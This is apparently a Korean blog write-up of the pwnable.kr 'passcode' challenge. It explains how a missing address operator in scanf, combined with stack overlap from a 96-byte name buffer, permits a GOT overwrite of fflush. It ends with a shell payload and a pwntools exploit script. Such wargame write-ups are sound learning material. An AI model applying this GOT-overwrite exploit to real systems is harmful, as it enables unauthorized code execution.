---
layout: post
title:  "5. passcode"
subtitle: ""
date:   2018-09-24 13:46:13 +0900
categories: security
tags : pwnable
---

![1]({{"/assets/img/security/pwnable/5/1.png" | absolute_url}})

컴파일 할 때 warning이 떴다고 한다.

코드를 살펴보자
  
<br>

![2]({{"/assets/img/security/pwnable/5/2.png" | absolute_url}})

warning이 뜰 만한 곳이 어디가 있나 찾다가

위에 빨간색 상자로 표시한 passcode 부분에 주소연산자(&)가 없는 것을 알았다..

첨엔 뭐가 잘못된 건 줄 모르고 실행했는데

<br>

![3]({{"/assets/img/security/pwnable/5/3.png" | absolute_url}})

segmentation fault....


후에 소스코드를 자세히 살펴보니 `passcode1`과 `passcode2`에 주소연산자가 없는 것을 발견했고

당연히 segmentation fault가 뜨는 것이 이해가 갔다.

<br>
![4]({{"/assets/img/security/pwnable/5/4.png" | absolute_url}})

정상적인 입력이라면 위와 같아야 한다.

`passcode1`의 주소에 입력을 받아야 하지만

주소연산자(&)가 없는 경우엔 다음과 같이 된다.

<br>
![5]({{"/assets/img/security/pwnable/5/5.png" | absolute_url}})

주소연산자가 없으면 scanf로 입력받은 입력 값은 `passcode1`의 주소에 할당되지 않고

`passcode1`의 주소에 있는 값을 한 번 더 참조해서 거기에 값이 할당된다.

그래서 건드릴 수 없는 영역의 메모리를 건드려 segmentation fault가 뜨는 것이다.



여기서 생각해볼 수 있는 공격 방법은

만약 `passcode1`의 주소에 임의의 값 `ex) 0xaabb`을 넣을 수 있으면

내가 `scanf`로 입력하는 값은 임의의 주소 `ex) 0xaabb`로 들어가게 될 것이다.

한마디로 하나의 임의의 주소에 원하는 값을 쓸 수 있게 되는 것이다.

그럼 혹시 `passcode1`의 주소를 덮을 수 있는 방법이 없나 살펴보면

login 함수 호출 전에 로그인 ID를 입력받는 welcome 함수를 생각해볼 수 있다.


<br>
![6]({{"/assets/img/security/pwnable/5/6.png" | absolute_url}})

welcome 함수에선 이렇게 100바이트 문자열에 입력을 받는다.

입력한 문자열의 시작 주소가 어딘지 살펴본다.


<br>
![7]({{"/assets/img/security/pwnable/5/7.png" | absolute_url}})

저기서 입력한 값이 시작되더라.

`0xff83dcac`

`char name[100]` 변수에 입력한 값이 시작되는 주소이다.

그럼 login 함수의 `passcode1`의 주소가 어딘지 살펴본다.


<br>
![8]({{"/assets/img/security/pwnable/5/8.png" | absolute_url}})

login 함수에서 첫 번째 `scanf`가 호출되기 전에 매개변수를 스택에 쌓는 부분이다.

`"%d"` 문자열을 먼저 eax 레지스터에 넣고 

ebp레지스터 주소의 `0x10`을 뺀 곳의 값을 edx 레지스터에 넣는다.

그리고 esp의 주소와 esp+4의 주소에 edx와 eax를 각 각 넣는 것을 볼 수 있다.

eax레지스터에는 `"%d"`가 있으므로 edx가 `passcode1`의 주소일 것이다.

edx레지스터는 ebp레지스터에서 0x10을 뺀 곳에서 왔으므로 해당 부분에 bp를 걸고

`ebp-0x10`의 주소를 확인해본다.


<br>
![9]({{"/assets/img/security/pwnable/5/9.png" | absolute_url}})

`0xff82dd08`이 `ebp-0x10`의 주소이다

해당 주소 내에 있는 `0xf760fcab`가 우리가 scanf로 입력한 값이 실제로 할당될 주소이다.

welcome 함수에서 사용하는 name 변수와 얼마나 차이가 있는지 살펴본다


<br>
![10]({{"/assets/img/security/pwnable/5/10.png" | absolute_url}})

name 변수의 입력 주소로부터 96바이트 차이가 나고 그 이후부터 `passcode1`의 주소가 있다.

welcome 함수에서 `97번째` 바이트부터 원하는 주소를 입력하면

`passcode1`의 값을 수정할 수 있다.

그럼 이제 `passcode1`에 있는 주소를 어떤 주소로 바꿔야 하는지 고민했는데

이건 `GOT overwrite` 문제인 것을 깨달았다..


<br>
<br>
### [1. PLT와 GOT란?]({{"https://bpsecblog.wordpress.com/2016/03/07/about_got_plt_1/"}})

PLT와 GOT를 여기서 다루기엔 너무 양이 많아서 자세히 설명된 타 블로그 게시물의 링크를 첨부한다..

무튼.. 라이브러리 함수를 호출할 때 GOT 테이블을 참조해서 실제 함수의 프로시져를 호출하는데

GOT 테이블을 조작하여 임의의 주소를 덮으면 해당 라이브러리 함수가 호출될 때 덮어진 주소로 점프하게 된다.
<br>
![11]({{"/assets/img/security/pwnable/5/11.png" | absolute_url}})

예를들어 이번 문제에서는 `fflush` 함수를 이용할 수 있다.

`fflush` 함수를 호출하면 먼저 PLT로 점프하고 PLT에서 GOT로 점프하여

실제 `fflush` 함수에 대해 매핑된 메모리 주소로 점프를 하게 된다.

이 문제에서 그러면 `passcode1`의 주소를 GOT에서 `fflush`에 매핑된 주소로 덮고

scanf 함수의 입력으로 우리가 원하는 주소를 적으면 `fflush`가 호출될 때

우리가 원하는 주소로 가게 된다.


#### 그러면 우리가 원하는 주소는 뭐냐?

<br>
![12]({{"/assets/img/security/pwnable/5/12.jpeg" | absolute_url}})

이거지.

if절 다 짤라먹고 결국 저거만 실행시키면 되는거다.

저 주소는 어디냐면 

<br>
![13]({{"/assets/img/security/pwnable/5/13.png" | absolute_url}})

빨간색 박스 부분이다.

`0x080485d7` 저 부분의 주소로 fflush의 GOT 주소를 바꾸면 `fflush`가 호출될 때 플래그를 읽을 수 있다.

여기까지 파악이 됐으니까 이제 fflush의 GOT 주소만 알아내면 된다.
<br>
![14]({{"/assets/img/security/pwnable/5/14.png" | absolute_url}})

fflush가 호출될 때 `0x8048430`이라는 주소를 호출한다.

이 부분이 PLT의 주소이고 이 부분의 명령어들을 출력해보면

<br>
![15]({{"/assets/img/security/pwnable/5/15.png" | absolute_url}})

이렇다. 여기 가자마자 `0x804a004`로 점프를 하는데

이 부분을 가면

<br>
![16]({{"/assets/img/security/pwnable/5/16.png" | absolute_url}})

fflush의 GOT 주소가 여기인거다.

`0x804a004`

찾았다.

추가로 오버해서 설명을 적으면 이 주소에 할당된 `0x08048436` 이 주소는 실제 fflush 프로시져의 주소는 아니다.

fflush가 최초로 호출된 것이라서 실제 프로시져의 주소를 알기 위해서

`dll_resolve`를 통해 실제 주소를 가져와 GOT에 쓰고, 이후 호출될 때는 GOT에 쓰여진 실제 주소를 통해

라이브러리 함수가 사용되는 것이다.

자세한건 위에 PLT와 GOT 정리 글을...

<br>
![17]({{"/assets/img/security/pwnable/5/17.png" | absolute_url}})

아무튼 정리해서..

1. welcome의 name 입력 부에서 96바이트를 아무 문자나 입력

2. `97번째` 바이트부턴 `passcode1`의 주소이므로 `0x804a004`를 입력

3. scanf가 호출되면 `0x080485d7(flag를 읽는 system 함수)`을 입력


그러면 scanf를 통해 읽는 값`0x080485d7`이 `0x804a004(fflush의 GOT 프로시져 주소)`에 쓰여지기 때문에 

ffush를 호출하면 플래그를 읽는 명령어를 호출하게 되는 것!

`passcode1`에 입력하는 값은 정수형으로 변환해서..

<br>
![18]({{"/assets/img/security/pwnable/5/18.png" | absolute_url}})

페이로드는 이렇게..

{% highlight bash %}
(python -c 'print "A"*96 + "\x04\xa0\x04\x08"' ; cat) | ./passcode
{% endhighlight %}
<br>
![19]({{"/assets/img/security/pwnable/5/19.png" | absolute_url}})


-------------------------------------------------------
### pwntools

![20]({{"/assets/img/security/pwnable/5/20.png" | absolute_url}})


{% highlight python %}
from pwn import *
 
id   = 'passcode'
host = 'pwnable.kr'
port = 2222
pw   = 'guest'
 
s = ssh(id, host, port=port, password=pw)
 
p = 0x0804a004
 
payload = 'A'*96 + p32(p)
 
res = s.run('./passcode')
 
res.sendline(payload)
 
res.sendline('134514135')
 
print res.recvall()
 
s.close()
{% endhighlight %}
